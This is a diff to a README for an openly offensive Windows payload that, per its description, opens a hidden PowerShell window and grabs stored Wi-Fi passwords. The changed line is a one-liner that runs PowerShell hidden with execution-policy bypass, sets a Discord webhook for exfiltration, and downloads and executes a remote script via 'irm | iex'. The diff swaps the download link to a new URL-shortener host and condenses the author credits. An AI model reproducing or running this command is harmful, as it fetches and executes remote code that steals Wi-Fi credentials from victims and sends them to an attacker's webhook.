@@ -15,27 +15,9 @@ Opens a hidden PowerShell window, grabs wlan passwords, saves as a cleartext in 
 The following command will create the "$discord" variable, pull down and invoke the 'Win-Wii-Pwds.ps1' poershell script.
 
 ```powershell
-powershell -w h -ep bypass $discord='<your_webhook_URL_here>';irm bit.ly/WindowsWiFiPasswordsENG | iex
+powershell -w h -ep bypass $discord='<your_webhook_URL_here>';irm https://tinyurl.com/ckadlov-win-wifi1 | iex
 ```
 
 ## Credits
 
-<h2 align="center"> Aleff :octocat: </h2>
-<div align=center>
-<table>
-  <tr>
-    <td align="center" width="96">
-      <a href="https://github.com/aleff-github">
-        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
-      </a>
-      <br>Github
-    </td>
-    <td align="center" width="96">
-      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
-        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
-      </a>
-      <br>Linkedin
-    </td>
-  </tr>
-</table>
-</div>
+<a href="https://github.com/aleff-github">Aleff :octocat:</a>
